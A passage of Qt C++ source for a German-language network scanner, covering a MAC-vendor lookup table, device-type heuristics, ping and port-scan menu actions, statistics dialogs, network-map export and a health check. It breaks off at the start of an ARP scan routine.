{\"C06394\", \"TP-Link Technologies\"},\r\n                                               {\"E8DE27\", \"TP-Link Technologies\"}, {\"F46BEF\", \"TP-Link Technologies\"},\r\n\r\n                                               // D-Link\r\n                                               {\"001195\", \"D-Link Corporation\"}, {\"001346\", \"D-Link Corporation\"},\r\n                                               {\"001CF0\", \"D-Link Corporation\"}, {\"002191\", \"D-Link Corporation\"},\r\n                                               {\"1C7EE5\", \"D-Link Corporation\"}, {\"5CD998\", \"D-Link Corporation\"},\r\n                                               {\"CCB255\", \"D-Link Corporation\"}, {\"E46F13\", \"D-Link Corporation\"},\r\n\r\n                                               // ASUS\r\n                                               {\"000C6E\", \"ASUSTeK Computer\"}, {\"001E8C\", \"ASUSTeK Computer\"},\r\n                                               {\"002354\", \"ASUSTeK Computer\"}, {\"0026180\", \"ASUSTeK Computer\"},\r\n                                               {\"1C872C\", \"ASUSTeK Computer\"}, {\"2C56DC\", \"ASUSTeK Computer\"},\r\n                                               {\"382C4A\", \"ASUSTeK Computer\"}, {\"60A44C\", \"ASUSTeK Computer\"},\r\n                                               {\"74D435\", \"ASUSTeK Computer\"}, {\"BC863E\", \"ASUSTeK Computer\"},\r\n                                               {\"F832E4\", \"ASUSTeK Computer\"}, {\"FC34AE\", \"ASUSTeK Computer\"},\r\n\r\n                                               // Huawei\r\n                                               {\"001EC0\", \"Huawei Technologies\"}, {\"002312\", \"Huawei Technologies\"},\r\n                                               {\"4C549F\", \"Huawei Technologies\"}, {\"5C338A\", \"Huawei Technologies\"},\r\n                                               {\"642737\", \"Huawei Technologies\"}, {\"6C4F42\", \"Huawei Technologies\"},\r\n                                               {\"844BF5\", \"Huawei Technologies\"}, {\"9C28EF\", \"Huawei Technologies\"},\r\n                                               {\"C8A823\", \"Huawei Technologies\"}, {\"E0A3AC\", \"Huawei Technologies\"},\r\n\r\n                                               // Xiaomi\r\n                                               {\"647002\", \"Xiaomi Communications\"}, {\"788A20\", \"Xiaomi Communications\"},\r\n                                               {\"8CFABA\", \"Xiaomi Communications\"}, {\"98FA9B\", \"Xiaomi Communications\"},\r\n                                               {\"A0E4CB\", \"Xiaomi Communications\"}, {\"F48E38\", \"Xiaomi Communications\"},\r\n\r\n                                               // Raspberry Pi Foundation\r\n                                               {\"B827EB\", \"Raspberry Pi Foundation\"}, {\"DCA632\", \"Raspberry Pi Foundation\"},\r\n                                               {\"E45F01\", \"Raspberry Pi Foundation\"},\r\n\r\n                                               // VMware\r\n                                               {\"005056\", \"VMware Inc.\"}, {\"000C29\", \"VMware Inc.\"}, {\"001C14\", \"VMware Inc.\"},\r\n\r\n                                               // VirtualBox\r\n                                               {\"080027\", \"VirtualBox (Oracle)\"}, {\"525400\", \"QEMU/KVM\"},\r\n\r\n                                               // Amazon\r\n                                               {\"061F29\", \"Amazon Technologies Inc.\"}, {\"124B66\", \"Amazon Technologies Inc.\"},\r\n\r\n                                               // Google\r\n                                               {\"001A11\", \"Google Inc.\"}, {\"3C5AB4\", \"Google Inc.\"},\r\n\r\n                                               // Common Router/Modem brands\r\n                                               {\"00904C\", \"Netgear Inc.\"}, {\"CC40D0\", \"Netgear Inc.\"}, {\"E091F5\", \"Netgear Inc.\"},\r\n                                               {\"000FB5\", \"Netgear Inc.\"}, {\"2C3033\", \"Netgear Inc.\"}, {\"84C9B2\", \"Netgear Inc.\"},\r\n                                               {\"001CDF\", \"Belkin International\"}, {\"944452\", \"Belkin International\"},\r\n                                               {\"BE9DA7\", \"Belkin International\"}, {\"EC1A59\", \"Belkin International\"},\r\n                                               {\"001D7E\", \"Linksys\"}, {\"0018F8\", \"Linksys\"}, {\"0020A6\", \"Linksys\"},\r\n                                               {\"68CA.E4\", \"Linksys\"}, {\"C05627\", \"Linksys\"}, {\"E0CB4E\", \"Linksys\"},\r\n                                               };\r\n\r\n    QString vendor = vendorMap.value(oui, \"Unbekannter Hersteller\");\r\n\r\n    // If not found in our database, try to determine device type by MAC pattern\r\n    if (vendor == \"Unbekannter Hersteller\") {\r\n        // Some heuristics based on MAC patterns\r\n        if (oui.startsWith(\"00\") || oui.startsWith(\"02\")) {\r\n            vendor = \"Vermutlich Router/Modem\";\r\n        } else if (oui.startsWith(\"52\")) {\r\n            vendor = \"Virtualisiert (QEMU/KVM)\";\r\n        } else if (oui.startsWith(\"08\")) {\r\n            vendor = \"Vermutlich VM (VirtualBox)\";\r\n        }\r\n    }\r\n\r\n    return vendor;\r\n}\r\nvoid IpScanner::analyzeNetworkTopology()\r\n{\r\n    addLogEntry(\"Analysiere Netzwerk-Topologie...\", \"INFO\");\r\n\r\n    // Get all discovered hosts and analyze network structure\r\n    QMap<QString, QList<HostInfo>> networkMap;\r\n\r\n    for (const HostInfo &host : discoveredHosts) {\r\n        QString subnet = getSubnetFromIp(host.ip);\r\n        networkMap[subnet].append(host);\r\n    }\r\n\r\n    // Create topology analysis\r\n    QString topologyReport = \"=== NETZWERK-TOPOLOGIE ANALYSE ===\\n\\n\";\r\n\r\n    for (auto it = networkMap.begin(); it != networkMap.end(); ++it) {\r\n        QString subnet = it.key();\r\n        QList<HostInfo> hosts = it.value();\r\n\r\n        topologyReport += QString(\"📍 Subnetz: %1\\n\").arg(subnet);\r\n        topologyReport += QString(\"   Hosts: %1\\n\").arg(hosts.size());\r\n\r\n        // Analyze device types\r\n        int routers = 0, servers = 0, workstations = 0, unknown = 0;\r\n\r\n        for (const HostInfo &host : hosts) {\r\n            if (isLikelyRouter(host)) {\r\n                routers++;\r\n            } else if (isLikelyServer(host)) {\r\n                servers++;\r\n            } else if (isLikelyWorkstation(host)) {\r\n                workstations++;\r\n            } else {\r\n                unknown++;\r\n            }\r\n        }\r\n\r\n        topologyReport += QString(\"   Router/Gateways: %1\\n\").arg(routers);\r\n        topologyReport += QString(\"   Server: %1\\n\").arg(servers);\r\n        topologyReport += QString(\"   Arbeitsstationen: %1\\n\").arg(workstations);\r\n        topologyReport += QString(\"   Unbekannt: %1\\n\\n\").arg(unknown);\r\n    }\r\n\r\n    // Show topology analysis in a dialog\r\n    QDialog *topologyDialog = new QDialog(this);\r\n    topologyDialog->setWindowTitle(\"🌐 Netzwerk-Topologie Analyse\");\r\n    topologyDialog->resize(600, 500);\r\n    topologyDialog->setStyleSheet(styleSheet()); // Apply dark theme\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(topologyDialog);\r\n    QTextEdit *reportEdit = new QTextEdit();\r\n    reportEdit->setPlainText(topologyReport);\r\n    reportEdit->setReadOnly(true);\r\n    reportEdit->setFont(QFont(\"Consolas\", 10));\r\n\r\n    QPushButton *closeButton = new QPushButton(\"❌ Schließen\");\r\n    QPushButton *exportButton = new QPushButton(\"📤 Exportieren\");\r\n\r\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\r\n    buttonLayout->addWidget(exportButton);\r\n    buttonLayout->addStretch();\r\n    buttonLayout->addWidget(closeButton);\r\n\r\n    layout->addWidget(reportEdit);\r\n    layout->addLayout(buttonLayout);\r\n\r\n    connect(closeButton, &QPushButton::clicked, topologyDialog, &QDialog::accept);\r\n    connect(exportButton, &QPushButton::clicked, [this, topologyDialog]() {\r\n        exportNetworkMap();\r\n        topologyDialog->accept();\r\n    });\r\n\r\n    topologyDialog->exec();\r\n\r\n    addLogEntry(\"Netzwerk-Topologie Analyse abgeschlossen\", \"SUCCESS\");\r\n}\r\nbool IpScanner::isLikelyWorkstation(const HostInfo &host)\r\n{\r\n    // Heuristics for workstation detection\r\n    return host.openPorts.size() > 0 && host.openPorts.size() < 5 && !isLikelyRouter(host) && !isLikelyServer(host);\r\n}\r\nbool IpScanner::isLikelyRouter(const HostInfo &host)\r\n{\r\n    // Heuristics for router detection\r\n    QStringList routerPorts = {\"22\", \"23\", \"80\", \"443\", \"8080\"};\r\n    QString ip = host.ip;\r\n\r\n    // Common router IPs\r\n    if (ip.endsWith(\".1\") || ip.endsWith(\".254\") || ip.endsWith(\".100\")) {\r\n        return true;\r\n    }\r\n\r\n    // Has common router ports and services\r\n    int routerPortCount = 0;\r\n    for (const QString &port : host.openPorts) {\r\n        if (routerPorts.contains(port)) {\r\n            routerPortCount++;\r\n        }\r\n    }\r\n\r\n    return routerPortCount >= 2;\r\n}\r\nvoid IpScanner::setupNetworkContextMenu()\r\n{\r\n    networkTree->setContextMenuPolicy(Qt::CustomContextMenu);\r\n    connect(networkTree, &QWidget::customContextMenuRequested,\r\n            this, &IpScanner::showNetworkContextMenu);\r\n}\r\nvoid IpScanner::showNetworkContextMenu(const QPoint &pos)\r\n{\r\n    QTreeWidgetItem *item = networkTree->itemAt(pos);\r\n    if (!item) return;\r\n\r\n    QString ip = item->text(1);\r\n    QString deviceName = item->text(0);\r\n    QString mac = item->text(2);\r\n\r\n    QMenu menu(this);\r\n    menu.setStyleSheet(\"QMenu { background-color: #2d2d2d; color: white; border: 1px solid #404040; }\");\r\n\r\n    if (!ip.isEmpty() && ip != \"N/A\") {\r\n        menu.addAction(\"🏓 Host pingen\", [this, ip]() {\r\n            targetEdit->setText(ip);\r\n            pingHost();\r\n        });\r\n\r\n        menu.addAction(\"🔌 Ports scannen\", [this, ip]() {\r\n            targetEdit->setText(ip);\r\n            portScan();\r\n        });\r\n\r\n        menu.addAction(\"🌐 Im Browser öffnen\", [ip]() {\r\n            QDesktopServices::openUrl(QUrl(QString(\"http://%1\").arg(ip)));\r\n        });\r\n\r\n        menu.addSeparator();\r\n\r\n        menu.addAction(\"📋 IP kopieren\", [this, ip]() {\r\n            QApplication::clipboard()->setText(ip);\r\n            addLogEntry(QString(\"IP %1 kopiert\").arg(ip), \"INFO\");\r\n        });\r\n\r\n        if (!mac.isEmpty() && mac != \"N/A\") {\r\n            menu.addAction(\"📋 MAC kopieren\", [this, mac]() {\r\n                QApplication::clipboard()->setText(mac);\r\n                addLogEntry(QString(\"MAC %1 kopiert\").arg(mac), \"INFO\");\r\n            });\r\n        }\r\n\r\n        menu.addSeparator();\r\n\r\n        menu.addAction(\"ℹ️ Details anzeigen\", [this, item]() {\r\n            showNetworkDeviceDetails(item);\r\n        });\r\n\r\n        menu.addAction(\"🗑️ Aus Liste entfernen\", [this, item, ip]() {\r\n            delete item;\r\n            addLogEntry(QString(\"Netzwerkgerät %1 entfernt\").arg(ip), \"INFO\");\r\n        });\r\n    }\r\n\r\n    menu.exec(networkTree->mapToGlobal(pos));\r\n}\r\nvoid IpScanner::showNetworkDeviceDetails(QTreeWidgetItem *item)\r\n{\r\n    if (!item) return;\r\n\r\n    QString deviceName = item->text(0);\r\n    QString ip = item->text(1);\r\n    QString mac = item->text(2);\r\n    QString vendor = item->text(3);\r\n    QString interface = item->text(4);\r\n    QString type = item->text(5);\r\n    QString lastSeen = item->text(6);\r\n\r\n    // Create detailed information dialog\r\n    QDialog *detailsDialog = new QDialog(this);\r\n    detailsDialog->setWindowTitle(QString(\"🖥️ Gerät Details - %1\").arg(deviceName));\r\n    detailsDialog->resize(500, 400);\r\n    detailsDialog->setStyleSheet(styleSheet()); // Apply dark theme\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(detailsDialog);\r\n\r\n    // Device information\r\n    QTextEdit *detailsEdit = new QTextEdit();\r\n    detailsEdit->setReadOnly(true);\r\n\r\n    QString detailsText = QString(R\"(\r\n<h2>🖥️ Netzwerk-Gerät Informationen</h2>\r\n\r\n<h3>📍 Grundlegende Informationen</h3>\r\n<table border=\"0\" cellpadding=\"5\">\r\n<tr><td><b>Gerätename:</b></td><td>%1</td></tr>\r\n<tr><td><b>IP-Adresse:</b></td><td>%2</td></tr>\r\n<tr><td><b>MAC-Adresse:</b></td><td>%3</td></tr>\r\n<tr><td><b>Hersteller:</b></td><td>%4</td></tr>\r\n<tr><td><b>Gerätetyp:</b></td><td>%5</td></tr>\r\n<tr><td><b>Interface:</b></td><td>%6</td></tr>\r\n<tr><td><b>Letzte Aktivität:</b></td><td>%7</td></tr>\r\n</table>\r\n\r\n<h3>🔍 Erweiterte Analyse</h3>\r\n<p><b>Subnetz:</b> %8</p>\r\n<p><b>Wahrscheinlicher Typ:</b> %9</p>\r\n\r\n<h3>📝 Notizen</h3>\r\n<p>Doppelklick für weitere Aktionen oder verwenden Sie das Kontextmenü für zusätzliche Optionen.</p>\r\n    )\").arg(deviceName, ip, mac, vendor, type, interface, lastSeen,\r\n                                   getSubnetFromIp(ip),\r\n                                   type.contains(\"Router\") ? \"Netzwerk-Gateway\" :\r\n                                       type.contains(\"Server\") ? \"Server/Dienst\" : \"Endgerät\");\r\n\r\n    detailsEdit->setHtml(detailsText);\r\n\r\n    // Action buttons\r\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\r\n\r\n    QPushButton *pingButton = new QPushButton(\"🏓 Ping\");\r\n    QPushButton *portScanButton = new QPushButton(\"🔌 Port Scan\");\r\n    QPushButton *closeButton = new QPushButton(\"❌ Schließen\");\r\n\r\n    pingButton->setStyleSheet(\"QPushButton { background-color: #28a745; }\");\r\n    portScanButton->setStyleSheet(\"QPushButton { background-color: #17a2b8; }\");\r\n    closeButton->setStyleSheet(\"QPushButton { background-color: #dc3545; }\");\r\n\r\n    buttonLayout->addWidget(pingButton);\r\n    buttonLayout->addWidget(portScanButton);\r\n    buttonLayout->addStretch();\r\n    buttonLayout->addWidget(closeButton);\r\n\r\n    layout->addWidget(detailsEdit);\r\n    layout->addLayout(buttonLayout);\r\n\r\n    // Connect button actions\r\n    connect(pingButton, &QPushButton::clicked, [this, ip, detailsDialog]() {\r\n        targetEdit->setText(ip);\r\n        detailsDialog->accept();\r\n        pingHost();\r\n    });\r\n\r\n    connect(portScanButton, &QPushButton::clicked, [this, ip, detailsDialog]() {\r\n        targetEdit->setText(ip);\r\n        detailsDialog->accept();\r\n        portScan();\r\n    });\r\n\r\n    connect(closeButton, &QPushButton::clicked, detailsDialog, &QDialog::accept);\r\n\r\n    detailsDialog->exec();\r\n}\r\nvoid IpScanner::showNetworkStatistics()\r\n{\r\n    // Calculate network statistics\r\n    int totalDevices = networkTree->topLevelItemCount();\r\n    int routers = 0, servers = 0, workstations = 0, unknown = 0;\r\n    QSet<QString> uniqueVendors;\r\n    QSet<QString> uniqueSubnets;\r\n\r\n    for (int i = 0; i < networkTree->topLevelItemCount(); ++i) {\r\n        QTreeWidgetItem *item = networkTree->topLevelItem(i);\r\n        QString type = item->text(5);\r\n        QString vendor = item->text(3);\r\n        QString ip = item->text(1);\r\n\r\n        if (type.contains(\"Router\") || type.contains(\"Gateway\")) {\r\n            routers++;\r\n        } else if (type.contains(\"Server\")) {\r\n            servers++;\r\n        } else if (type.contains(\"Computer\") || type.contains(\"Device\")) {\r\n            workstations++;\r\n        } else {\r\n            unknown++;\r\n        }\r\n\r\n        if (!vendor.isEmpty() && vendor != \"Unbekannt\") {\r\n            uniqueVendors.insert(vendor);\r\n        }\r\n\r\n        if (!ip.isEmpty()) {\r\n            uniqueSubnets.insert(getSubnetFromIp(ip));\r\n        }\r\n    }\r\n\r\n    // Create statistics dialog\r\n    QDialog *statsDialog = new QDialog(this);\r\n    statsDialog->setWindowTitle(\"📊 Netzwerk-Statistiken\");\r\n    statsDialog->resize(600, 500);\r\n    statsDialog->setStyleSheet(styleSheet());\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(statsDialog);\r\n    QTextEdit *statsEdit = new QTextEdit();\r\n    statsEdit->setReadOnly(true);\r\n\r\n    QString statsText = QString(R\"(\r\n<h2>📊 Netzwerk-Statistiken</h2>\r\n\r\n<h3>🔢 Gerätezusammenfassung</h3>\r\n<table border=\"1\" cellpadding=\"8\">\r\n<tr><td><b>Gesamte Geräte:</b></td><td>%1</td></tr>\r\n<tr><td><b>Router/Gateways:</b></td><td>%2</td></tr>\r\n<tr><td><b>Server:</b></td><td>%3</td></tr>\r\n<tr><td><b>Arbeitsstationen:</b></td><td>%4</td></tr>\r\n<tr><td><b>Unbekannte Geräte:</b></td><td>%5</td></tr>\r\n</table>\r\n\r\n<h3>🏭 Hersteller-Vielfalt</h3>\r\n<p><b>Eindeutige Hersteller:</b> %6</p>\r\n<p><b>Gefundene Hersteller:</b><br>%7</p>\r\n\r\n<h3>🌐 Netzwerk-Segmente</h3>\r\n<p><b>Eindeutige Subnetze:</b> %8</p>\r\n<p><b>Erkannte Subnetze:</b><br>%9</p>\r\n\r\n<h3>📈 Netzwerk-Gesundheit</h3>\r\n<p><b>Aktive Geräte:</b> %10 von %11 entdeckt</p>\r\n<p><b>Scan-Abdeckung:</b> %12%</p>\r\n    )\").arg(totalDevices)\r\n                            .arg(routers)\r\n                            .arg(servers)\r\n                            .arg(workstations)\r\n                            .arg(unknown)\r\n                            .arg(uniqueVendors.size())\r\n                            .arg(QStringList(uniqueVendors.begin(), uniqueVendors.end()).join(\", \"))\r\n                            .arg(uniqueSubnets.size())\r\n                            .arg(QStringList(uniqueSubnets.begin(), uniqueSubnets.end()).join(\", \"))\r\n                            .arg(totalDevices)\r\n                            .arg(totalDevices) // Placeholder for total possible devices\r\n                            .arg(totalDevices > 0 ? 100 : 0); // Simplified percentage\r\n\r\n    statsEdit->setHtml(statsText);\r\n\r\n    QPushButton *closeButton = new QPushButton(\"Schließen\");\r\n    QPushButton *exportButton = new QPushButton(\"📤 Exportieren\");\r\n\r\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\r\n    buttonLayout->addWidget(exportButton);\r\n    buttonLayout->addStretch();\r\n    buttonLayout->addWidget(closeButton);\r\n\r\n    layout->addWidget(statsEdit);\r\n    layout->addLayout(buttonLayout);\r\n\r\n    connect(closeButton, &QPushButton::clicked, statsDialog, &QDialog::accept);\r\n    connect(exportButton, &QPushButton::clicked, [this, statsDialog]() {\r\n        exportNetworkMap();\r\n        statsDialog->accept();\r\n    });\r\n\r\n    statsDialog->exec();\r\n\r\n    addLogEntry(\"Netzwerk-Statistiken angezeigt\", \"INFO\");\r\n}\r\nvoid IpScanner::exportNetworkMap()\r\n{\r\n    QString fileName = QFileDialog::getSaveFileName(this,\r\n                                                    \"📤 Netzwerk-Karte Exportieren\",\r\n                                                    QString(\"network_map_%1.html\").arg(QDateTime::currentDateTime().toString(\"yyyyMMdd_hhmmss\")),\r\n                                                    \"HTML Files (*.html);;JSON Files (*.json);;CSV Files (*.csv)\");\r\n\r\n    if (fileName.isEmpty()) return;\r\n\r\n    QFile file(fileName);\r\n    if (!file.open(QIODevice::WriteOnly)) {\r\n        QMessageBox::warning(this, \"❌ Export Fehler\", \"Datei konnte nicht zum Schreiben geöffnet werden\");\r\n        return;\r\n    }\r\n\r\n    QTextStream stream(&file);\r\n\r\n    if (fileName.endsWith(\".html\")) {\r\n        // Export as HTML\r\n        stream << R\"(<!DOCTYPE html>\r\n<html>\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <title>Netzwerk-Karte</title>\r\n    <style>\r\n        body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 20px; }\r\n        h1 { color: #0078d4; text-align: center; }\r\n        .network-segment { border: 2px solid #0078d4; margin: 20px 0; padding: 15px; border-radius: 10px; background: #2d2d2d; }\r\n        .device { margin: 10px 0; padding: 10px; border-radius: 5px; background: #404040; }\r\n        .router { border-left: 5px solid #ff6b35; }\r\n        .server { border-left: 5px solid #ff4757; }\r\n        .workstation { border-left: 5px solid #2ed573; }\r\n        .unknown { border-left: 5px solid #ffa502; }\r\n        table { border-collapse: collapse; width: 100%; margin: 10px 0; }\r\n        th, td { border: 1px solid #404040; padding: 8px; text-align: left; }\r\n        th { background-color: #0078d4; }\r\n        .summary { background: #2d2d2d; padding: 15px; border-radius: 5px; margin: 20px 0; }\r\n    </style>\r\n</head>\r\n<body>\r\n    <h1>🌐 Netzwerk-Karte - )\" << QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\") << R\"(</h1>\r\n\r\n    <div class=\"summary\">\r\n        <h3>📊 Netzwerk-Übersicht</h3>\r\n        <p><strong>Gescannte Geräte:</strong> )\" << networkTree->topLevelItemCount() << R\"(</p>\r\n        <p><strong>Erstellt am:</strong> )\" << QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\") << R\"(</p>\r\n    </div>)\";\r\n\r\n        // Group devices by subnet\r\n        QMap<QString, QList<QTreeWidgetItem*>> subnetMap;\r\n        for (int i = 0; i < networkTree->topLevelItemCount(); ++i) {\r\n            QTreeWidgetItem *item = networkTree->topLevelItem(i);\r\n            if (!item) continue;\r\n\r\n            QString ip = item->text(1);\r\n            QString subnet = getSubnetFromIp(ip);\r\n            subnetMap[subnet].append(item);\r\n        }\r\n\r\n        // Generate HTML for each subnet\r\n        for (auto it = subnetMap.begin(); it != subnetMap.end(); ++it) {\r\n            QString subnet = it.key();\r\n            QList<QTreeWidgetItem*> devices = it.value();\r\n\r\n            stream << QString(R\"(\r\n    <div class=\"network-segment\">\r\n        <h3>🔗 Subnetz: %1 (%2 Geräte)</h3>\r\n        <table>\r\n            <tr>\r\n                <th>Gerät</th>\r\n                <th>IP-Adresse</th>\r\n                <th>MAC-Adresse</th>\r\n                <th>Hersteller</th>\r\n                <th>Typ</th>\r\n                <th>Letzte Aktivität</th>\r\n            </tr>)\").arg(subnet).arg(devices.size());\r\n\r\n            for (QTreeWidgetItem *device : devices) {\r\n                QString deviceClass = \"unknown\";\r\n                QString type = device->text(5);\r\n                if (type.contains(\"Router\")) deviceClass = \"router\";\r\n                else if (type.contains(\"Server\")) deviceClass = \"server\";\r\n                else if (type.contains(\"Computer\") || type.contains(\"Device\")) deviceClass = \"workstation\";\r\n\r\n                stream << QString(R\"(\r\n            <tr class=\"device %1\">\r\n                <td>%2</td>\r\n                <td>%3</td>\r\n                <td>%4</td>\r\n                <td>%5</td>\r\n                <td>%6</td>\r\n                <td>%7</td>\r\n            </tr>)\").arg(deviceClass)\r\n                              .arg(device->text(0))\r\n                              .arg(device->text(1))\r\n                              .arg(device->text(2))\r\n                              .arg(device->text(3))\r\n                              .arg(device->text(5))\r\n                              .arg(device->text(6));\r\n            }\r\n\r\n            stream << R\"(\r\n        </table>\r\n    </div>)\";\r\n        }\r\n\r\n        stream << R\"(\r\n    <div class=\"summary\">\r\n        <p><em>Generiert mit Advanced IP Scanner v2.0 - Netzwerk-Analyse-Modul</em></p>\r\n    </div>\r\n</body>\r\n</html>)\";\r\n\r\n        addLogEntry(QString(\"Netzwerk-Karte als HTML exportiert: %1\").arg(fileName), \"SUCCESS\");\r\n\r\n    } else if (fileName.endsWith(\".json\")) {\r\n        // Export as JSON\r\n        QJsonObject root;\r\n        root[\"scanner\"] = \"Advanced IP Scanner\";\r\n        root[\"module\"] = \"Network Analysis\";\r\n        root[\"version\"] = \"2.0\";\r\n        root[\"timestamp\"] = QDateTime::currentDateTime().toString(Qt::ISODate);\r\n        root[\"totalDevices\"] = networkTree->topLevelItemCount();\r\n\r\n        QJsonArray devicesArray;\r\n        for (int i = 0; i < networkTree->topLevelItemCount(); ++i) {\r\n            QTreeWidgetItem *item = networkTree->topLevelItem(i);\r\n            if (!item) continue;\r\n\r\n            QJsonObject deviceObj;\r\n            deviceObj[\"name\"] = item->text(0);\r\n            deviceObj[\"ip\"] = item->text(1);\r\n            deviceObj[\"mac\"] = item->text(2);\r\n            deviceObj[\"vendor\"] = item->text(3);\r\n            deviceObj[\"interface\"] = item->text(4);\r\n            deviceObj[\"type\"] = item->text(5);\r\n            deviceObj[\"lastSeen\"] = item->text(6);\r\n            deviceObj[\"subnet\"] = getSubnetFromIp(item->text(1));\r\n            devicesArray.append(deviceObj);\r\n        }\r\n\r\n        root[\"devices\"] = devicesArray;\r\n        QJsonDocument doc(root);\r\n        file.write(doc.toJson());\r\n\r\n        addLogEntry(QString(\"Netzwerk-Karte als JSON exportiert: %1\").arg(fileName), \"SUCCESS\");\r\n\r\n    } else if (fileName.endsWith(\".csv\")) {\r\n        // Export as CSV\r\n        stream << \"Gerätename,IP-Adresse,MAC-Adresse,Hersteller,Interface,Typ,Letzte Aktivität,Subnetz\\n\";\r\n\r\n        for (int i = 0; i < networkTree->topLevelItemCount(); ++i) {\r\n            QTreeWidgetItem *item = networkTree->topLevelItem(i);\r\n            if (!item) continue;\r\n\r\n            stream << QString(\"%1,%2,%3,%4,%5,%6,%7,%8\\n\")\r\n                          .arg(item->text(0))\r\n                          .arg(item->text(1))\r\n                          .arg(item->text(2))\r\n                          .arg(item->text(3))\r\n                          .arg(item->text(4))\r\n                          .arg(item->text(5))\r\n                          .arg(item->text(6))\r\n                          .arg(getSubnetFromIp(item->text(1)));\r\n        }\r\n\r\n        addLogEntry(QString(\"Netzwerk-Karte als CSV exportiert: %1\").arg(fileName), \"SUCCESS\");\r\n    }\r\n\r\n    QMessageBox::information(this, \"✅ Export Erfolgreich\",\r\n                             QString(\"Netzwerk-Karte erfolgreich exportiert:\\n%1\\n\\n📊 %2 Geräte exportiert\")\r\n                                 .arg(fileName).arg(networkTree->topLevelItemCount()));\r\n}\r\nvoid IpScanner::performNetworkHealthCheck()\r\n{\r\n    if (discoveredHosts.isEmpty()) {\r\n        QMessageBox::information(this, \"🏥 Netzwerk-Gesundheitscheck\",\r\n                                 \"Keine Hosts verfügbar. Führen Sie zuerst einen Scan durch.\");\r\n        return;\r\n    }\r\n\r\n    addLogEntry(\"Starte Netzwerk-Gesundheitscheck...\", \"INFO\");\r\n    statusBar()->showMessage(\"Netzwerk-Gesundheitscheck läuft...\");\r\n\r\n    // Collect all IPs for health check\r\n    QStringList targetIPs;\r\n    for (const HostInfo &host : discoveredHosts) {\r\n        targetIPs.append(host.ip);\r\n    }\r\n\r\n    // Create health check worker\r\n    NetworkHealthWorker *worker = new NetworkHealthWorker(targetIPs);\r\n\r\n    connect(worker, &NetworkHealthWorker::healthCheckStarted,\r\n            [this](int totalTargets) {\r\n                addLogEntry(QString(\"Gesundheitscheck gestartet für %1 Hosts\").arg(totalTargets), \"INFO\");\r\n            });\r\n\r\n    connect(worker, &NetworkHealthWorker::hostHealthResult,\r\n            [this](const QString &ip, bool reachable, int responseTime, int packetLoss, const QString &status) {\r\n                QString logMessage = QString(\"Health Check %1: %2 - %3ms, %4% Paketverlust\")\r\n                .arg(ip, status).arg(responseTime).arg(packetLoss);\r\n                addLogEntry(logMessage, reachable ? \"SUCCESS\" : \"WARNING\");\r\n            });\r\n\r\n    connect(worker, &NetworkHealthWorker::healthCheckCompleted,\r\n            [this](int totalHosts, int reachableHosts, int unreachableHosts) {\r\n                addLogEntry(QString(\"Netzwerk-Gesundheitscheck abgeschlossen: %1/%2 Hosts erreichbar\")\r\n                                .arg(reachableHosts).arg(totalHosts), \"SUCCESS\");\r\n                statusBar()->showMessage(\"Netzwerk-Gesundheitscheck abgeschlossen\");\r\n\r\n                // Show health summary\r\n                QString healthSummary = QString(R\"(\r\n🏥 Netzwerk-Gesundheitscheck Ergebnisse\r\n\r\n📊 Zusammenfassung:\r\n• Gesamte Hosts: %1\r\n• Erreichbare Hosts: %2 (%3%)\r\n• Nicht erreichbare Hosts: %4 (%5%)\r\n\r\n🎯 Netzwerk-Status: %6\r\n                )\").arg(totalHosts)\r\n                                            .arg(reachableHosts)\r\n                                            .arg(totalHosts > 0 ? (reachableHosts * 100) / totalHosts : 0)\r\n                                            .arg(unreachableHosts)\r\n                                            .arg(totalHosts > 0 ? (unreachableHosts * 100) / totalHosts : 0)\r\n                                            .arg(reachableHosts > totalHosts * 0.9 ? \"Ausgezeichnet 🟢\" :\r\n                                                     reachableHosts > totalHosts * 0.7 ? \"Gut 🟡\" : \"Kritisch 🔴\");\r\n\r\n                QMessageBox::information(this, \"🏥 Gesundheitscheck Abgeschlossen\", healthSummary);\r\n            });\r\n\r\n    threadPool->start(worker);\r\n}\r\nbool IpScanner::isLikelyServer(const HostInfo &host)\r\n{\r\n    // Heuristics for server detection\r\n    QStringList serverPorts = {\"21\", \"22\", \"25\", \"53\", \"80\", \"110\", \"143\", \"443\", \"993\", \"995\", \"3389\", \"5432\", \"3306\", \"1433\"};\r\n\r\n    int serverPortCount = 0;\r\n    for (const QString &port : host.openPorts) {\r\n        if (serverPorts.contains(port)) {\r\n            serverPortCount++;\r\n        }\r\n    }\r\n\r\n    return serverPortCount >= 3 || host.openPorts.contains(\"22\") || host.openPorts.contains(\"3389\");\r\n}\r\nQString IpScanner::getSubnetFromIp(const QString &ip)\r\n{\r\n    QStringList parts = ip.split('.');\r\n    if (parts.size() >= 3) {\r\n        return QString(\"%1.%2.%3.0/24\").arg(parts[0], parts[1], parts[2]);\r\n    }\r\n    return \"Unbekannt\";\r\n}\r\nvoid IpScanner::arpScan()\r\n{\r\n    QString selectedInterface = interfaceCombo->currentText();\r\n    if (selectedInterface.isEmpty() || selectedInterface.contains(\"Keine aktiven\")) {\r\n        QMessageBox::warning(this, \"📡 ARP Scan\",\r\n                             \"Bitte wählen Sie ein gültiges Netzwerk-Interface aus!\");\r\n        return;\r\n    }\r\n\r\n    QString interfaceName = selectedInterface.split(\" (\").first();\r\n\r\n    // WICHTIGER FIX: Button-Status bereits hier setzen um Doppel-Starts zu verhindern\r\n    if (!arpScanButton->isEnabled()) {\r\n        addLogEntry(\"ARP-Scan bereits aktiv\", \"WARNING\");\r\n        return;\r\n    }\r\n\r\n    addLogEntry(QString(\"Starte ARP-Scan auf Interface: %1\").arg(interfaceName), \"INFO\");\r\n    statusBar()->showMessage(QString(\"ARP-Scan läuft: %1...\").arg(interfaceName));\r\n\r\n    // UI sofort deaktivieren\r\n    arpScanButton->setEnabled(false);\r\n    arpScanButton->setText(\"📡 Scanne...\");\r\n\r\n    // KRITISCHER FIX: Worker mit QueuedConnection verbinden\r\n    EnhancedArpScanWorker *worker = new EnhancedArpScanWorker(interfaceName);\r\n\r\n    // Alle Signal-Verbindungen mit QueuedConnection für Thread-Safety\r\n    connect(worker, 